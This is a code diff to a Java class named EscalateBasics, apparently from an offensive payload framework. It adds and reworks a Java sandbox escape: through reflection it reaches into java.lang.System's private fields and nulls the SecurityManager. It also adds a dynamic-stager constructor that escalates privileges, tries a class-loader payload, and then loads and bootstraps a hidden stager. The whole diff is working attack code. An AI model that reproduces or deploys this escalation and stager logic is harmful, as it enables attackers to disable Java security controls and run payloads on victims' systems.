@@ -34,6 +34,7 @@
 
 package javapayload.escalate;
 
+import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 
@@ -42,9 +43,9 @@ import javapayload.stager.Stager;
 /**
  * This class contains static methods for basic sandbox privilege escalation,
  * that work without any additional classes. They are designed to be copied into
- * a stager, therefore this abstract class extends {@link Stager}.
+ * a (dyn-)stager, therefore this class extends {@link Stager}.
  */
-public abstract class EscalateBasics extends Stager {
+public class EscalateBasics extends Stager {
 
 	public static boolean escalate() throws Exception {
 		// +RuntimePermission(setSecurityManager)
@@ -57,11 +58,12 @@ public abstract class EscalateBasics extends Stager {
 		// +RuntimePermission(accessDeclaredMembers)
 		// +ReflectPermission(suppressAccessChecks)
 		try {
-			Method getDeclaredFields0 = Class.class.getDeclaredMethod("getDeclaredFields0", new Class[] { Boolean.TYPE });
+			Method getDeclaredFields0 = Class.forName("java.lang.Class").getDeclaredMethod("getDeclaredFields0", new Class[] { Boolean.TYPE });
 			getDeclaredFields0.setAccessible(true);
-			Field[] fields = (Field[]) getDeclaredFields0.invoke(System.class, new Object[] { Boolean.FALSE });
+			Field[] fields = (Field[]) getDeclaredFields0.invoke(Class.forName("java.lang.System"), new Object[] { Boolean.FALSE });
+			Class securityManagerClass = Class.forName("java.lang.SecurityManager");
 			for (int i = 0; i < fields.length; i++) {
-				if (fields[i].getType().equals(SecurityManager.class)) {
+				if (fields[i].getType().equals(securityManagerClass)) {
 					fields[i].setAccessible(true);
 					fields[i].set(null, null);
 					return true;
@@ -71,5 +73,61 @@ public abstract class EscalateBasics extends Stager {
 		}
 
 		return false;
+	}
+
+	// helper methods used by Escalate dynstager
+
+	private final Object realStager;
+
+	public EscalateBasics() throws Exception {
+		this(escalateFromDynstager());
+	}
+
+	public EscalateBasics(boolean loadStager) throws Exception {
+		if (loadStager) {
+			define("STAGER_CLASS");
+			realStager = define("BASE_STAGER").newInstance();
+		} else {
+			realStager = null;
+		}
+	}
+	
+	private Class define(String classConstant) throws IOException {
+		return define(classConstant.getBytes("ISO-8859-1"));
+	}
+
+	private static boolean escalateFromDynstager() throws Exception {
+		if (escalate())
+			return true;
+
+		// +RuntimePermission(createClassLoader)
+		try {
+			new EscalateBasics(false).define("CREATE_CLASS_LOADER_PAYLOAD").newInstance();
+			return true;
+		} catch (SecurityException ex) {
+		}
+
+		// class may not be available, therefore ignore errors
+		try {
+			EscalateLoader.escalate();
+		} catch (Throwable t) {
+		}
+		return true;
+	}
+
+	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
+		realStager.getClass().getMethod("bootstrap", new Class[] { Class.forName("[Ljava.lang.String;"), Boolean.TYPE }).invoke(realStager, new Object[] { parameters, new Boolean(needWait) });
+	}
+
+	public void waitReady() throws InterruptedException {
+		try {
+			realStager.getClass().getMethod("waitReady", new Class[0]).invoke(realStager, new Object[0]);
+		} catch (Exception ex) {
+			/* #JDK1.4 */try {
+				throw new RuntimeException(ex);
+			} catch (NoSuchMethodError ex2) /**/{
+				throw new RuntimeException(ex.toString());
+			}
+		}
 	}
 }
